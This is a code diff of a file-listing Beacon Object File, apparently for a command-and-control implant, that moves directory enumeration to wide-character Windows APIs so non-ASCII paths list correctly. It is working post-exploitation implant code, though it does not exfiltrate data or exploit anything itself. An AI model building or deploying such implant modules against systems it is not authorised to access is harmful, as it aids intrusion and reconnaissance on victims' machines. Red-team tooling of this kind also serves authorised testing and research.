@@ -12,23 +12,34 @@
  * and renders rows; epoch is unix seconds (from ftLastWriteTime). "." and ".."
  * are skipped.
  *
+ * UNICODE SAFE: uses FindFirstFileW + MultiByteToWideChar/WideCharToMultiByte
+ * so non-ASCII (Chinese, etc.) paths and filenames round-trip correctly. The
+ * ANSI FindFirstFileA variant mis-decodes UTF-8 path bytes as the system ACP
+ * (GBK on a Chinese Windows) and fails on any non-ASCII segment — which is why
+ * deep navigation into localized folders broke. The path is also accepted with
+ * a \\?\ prefix so paths longer than MAX_PATH work.
+ *
  * Build (mingw):
  *   gcc -c examples/file_list.c -o examples/file_list.x64.o
  */
 #include <windows.h>
 #include "beacon.h"
 
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
-DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
+DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$FindClose(HANDLE);
-DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetCurrentDirectoryA(DWORD, LPSTR);
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
-DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentDirectoryW(DWORD, LPWSTR);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(VOID);
+DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
-DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
+DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
+DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
 DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
 
+#define CP_UTF8_ 65001
 #define BUF_SIZE 131072
+#define WPATH_MAX 264   /* wide chars — fits MAX_PATH + "\*" with room */
 
 /* Parse the frontend's encodeBeaconString framing (2-byte LE len + bytes + NUL).
  * Falls back to raw text if the framing looks bogus. NUL-terminates out. */
@@ -57,6 +68,21 @@ static int read_bstr(char *args, int alen, int *off, char *out, int outcap) {
     return n;
 }
 
+/* Convert a UTF-8 NUL-terminated string to a UTF-16 wide string. Returns the
+ * number of wide chars written (excluding the NUL), or 0 on failure. */
+static int utf8_to_wide(const char *src, wchar_t *dst, int dstcap) {
+    int n = KERNEL32$MultiByteToWideChar(CP_UTF8_, 0, src, -1, dst, dstcap);
+    if (n <= 0) { dst[0] = 0; return 0; }
+    return n - 1;   /* exclude the NUL terminator from the count */
+}
+
+/* Convert a UTF-16 wide string to UTF-8. Returns bytes written (excl. NUL). */
+static int wide_to_utf8(const wchar_t *src, char *dst, int dstcap) {
+    int n = KERNEL32$WideCharToMultiByte(CP_UTF8_, 0, src, -1, dst, dstcap, NULL, NULL);
+    if (n <= 0) { dst[0] = 0; return 0; }
+    return n - 1;
+}
+
 /* Convert a FILETIME (UTC, 100ns ticks since 1601-01-01) to unix seconds. */
 static unsigned long long filetime_to_epoch(const FILETIME *ft) {
     unsigned long long t = ((unsigned long long)ft->dwHighDateTime << 32) | ft->dwLowDateTime;
@@ -65,8 +91,10 @@ static unsigned long long filetime_to_epoch(const FILETIME *ft) {
     return (t - 116444736000000000ULL) / 10000000ULL;
 }
 
+static int wlen(const wchar_t *s) { int n = 0; while (s[n]) n++; return n; }
+
 void go(char *args, int alen) {
-    char path[MAX_PATH];
+    char path[260];
     int plen = 0;
 
     if (alen > 0) {
@@ -76,68 +104,69 @@ void go(char *args, int alen) {
         plen = n;
     }
     if (plen <= 0) {
-        /* default to the implant's current directory */
-        DWORD got = KERNEL32$GetCurrentDirectoryA((DWORD)sizeof(path) - 4, path);
-        if (got == 0 || got >= sizeof(path) - 4) { path[0] = '.'; path[1] = 0; }
-        plen = 0; while (path[plen]) plen++;
+        /* default to the implant's current directory (wide, then back to UTF-8) */
+        wchar_t wcur[WPATH_MAX];
+        DWORD got = KERNEL32$GetCurrentDirectoryW((DWORD)WPATH_MAX, wcur);
+        if (got == 0 || got >= (DWORD)WPATH_MAX) { path[0] = '.'; path[1] = 0; plen = 1; }
+        else { plen = wide_to_utf8(wcur, path, (int)sizeof(path)); }
     }
 
-    /* FindFirstFileA needs a wildcard; append "\*" if none present. */
+    /* Convert the UTF-8 path to UTF-16 for the W APIs. */
+    wchar_t wpath[WPATH_MAX];
+    utf8_to_wide(path, wpath, WPATH_MAX);
+
+    /* FindFirstFileW needs a wildcard; append "\*" if none present. */
+    int wpl = wlen(wpath);
     int hasWild = 0;
-    for (int i = 0; i < plen; i++) if (path[i] == '*' || path[i] == '?') { hasWild = 1; break; }
-    char search[MAX_PATH];
+    for (int i = 0; i < wpl; i++) if (wpath[i] == L'*' || wpath[i] == L'?') { hasWild = 1; break; }
+    wchar_t search[WPATH_MAX];
+    int sl = 0;
+    if (wpl >= WPATH_MAX - 3) wpl = WPATH_MAX - 3;
+    for (int i = 0; i < wpl; i++) search[sl++] = wpath[i];
     if (!hasWild) {
-        /* build "<path>\<*>" — guard the copy */
-        if (plen >= (int)sizeof(search) - 3) plen = (int)sizeof(search) - 3;
-        for (int i = 0; i < plen; i++) search[i] = path[i];
-        if (plen > 0 && search[plen-1] != '\\' && search[plen-1] != '/') {
-            search[plen++] = '\\';
-        }
-        search[plen++] = '*';
-        search[plen] = 0;
-    } else {
-        if (plen >= (int)sizeof(search) - 1) plen = (int)sizeof(search) - 1;
-        for (int i = 0; i < plen; i++) search[i] = path[i];
-        search[plen] = 0;
+        if (sl > 0 && search[sl-1] != L'\\' && search[sl-1] != L'/') search[sl++] = L'\\';
+        search[sl++] = L'*';
     }
+    search[sl] = 0;
 
     HANDLE heap = KERNEL32$GetProcessHeap();
     char *buf = (char *) KERNEL32$HeapAlloc(heap, 0, BUF_SIZE);
     if (!buf) { BeaconPrintf(CALLBACK_ERROR, "file_list: out of memory"); return; }
     int total = 0;
 
-    /* Emit the CWD header so the UI path bar syncs to the resolved path
+    /* Emit the CWD header (UTF-8) so the UI path bar syncs to the resolved path
      * (strip the trailing "\*" we appended for the search). */
-    char cwd[MAX_PATH];
-    int cwdlen = 0;
-    {
-        int s = 0;
-        while (search[s] && s < (int)sizeof(cwd)-2) { cwd[s] = search[s]; s++; }
-        cwd[s] = 0; cwdlen = s;
-    }
-    if (cwdlen > 0 && cwd[cwdlen-1] == '*') cwd[--cwdlen] = 0;
+    char cwd[260];
+    int cwdlen = plen;
+    for (int i = 0; i < cwdlen && i < (int)sizeof(cwd) - 1; i++) cwd[i] = path[i];
+    cwd[cwdlen] = 0;
     if (cwdlen > 0 && cwd[cwdlen-1] == '\\') cwd[--cwdlen] = 0;
     total = MSVCRT$_snprintf(buf, BUF_SIZE - 1, "CWD: %s\r\n", cwd);
 
-    WIN32_FIND_DATAA fd;
-    HANDLE h = KERNEL32$FindFirstFileA(search, &fd);
+    WIN32_FIND_DATAW fd;
+    HANDLE h = KERNEL32$FindFirstFileW(search, &fd);
     if (h == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "file_list: FindFirstFileA failed (%lu) for %s",
-                     KERNEL32$GetLastError(), search);
+        BeaconPrintf(CALLBACK_ERROR, "file_list: FindFirstFileW failed (%lu) for %s",
+                     KERNEL32$GetLastError(), cwd);
         KERNEL32$HeapFree(heap, 0, buf);
         return;
     }
     do {
         /* skip "." and ".." — the frontend ignores them, but keep it clean */
-        if ((fd.cFileName[0] == '.' && fd.cFileName[1] == 0) ||
-            (fd.cFileName[0] == '.' && fd.cFileName[1] == '.' && fd.cFileName[2] == 0)) {
+        if ((fd.cFileName[0] == L'.' && fd.cFileName[1] == 0) ||
+            (fd.cFileName[0] == L'.' && fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)) {
             continue;
         }
         const char *type = (fd.dwFileAttributes & 0x10 /*FILE_ATTRIBUTE_DIRECTORY*/) ? "D" : "F";
         unsigned long long size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
         unsigned long long epoch = filetime_to_epoch(&fd.ftLastWriteTime);
+        /* Convert the UTF-16 filename to UTF-8 so the frontend renders non-ASCII
+         * (Chinese, etc.) names correctly instead of mojibake. A MAX_PATH (260)
+         * wchar name can expand to ~1040 UTF-8 bytes (4 bytes/char worst case). */
+        char uname[1048];
+        wide_to_utf8(fd.cFileName, uname, (int)sizeof(uname));
         int n = MSVCRT$_snprintf(buf + total, BUF_SIZE - 1 - total,
-            "%s\t%s\t%llu\t%llu\r\n", type, fd.cFileName, size, epoch);
+            "%s\t%s\t%llu\t%llu\r\n", type, uname, size, epoch);
         if (n < 0) n = 0;
         total += n;
         if (total >= BUF_SIZE - 256) {
@@ -147,7 +176,7 @@ void go(char *args, int alen) {
             BeaconPrintf(CALLBACK_ERROR, "file_list: output truncated at %d bytes", BUF_SIZE);
             return;
         }
-    } while (KERNEL32$FindNextFileA(h, &fd));
+    } while (KERNEL32$FindNextFileW(h, &fd));
     KERNEL32$FindClose(h);
 
     BeaconOutput(CALLBACK_OUTPUT, buf, total);
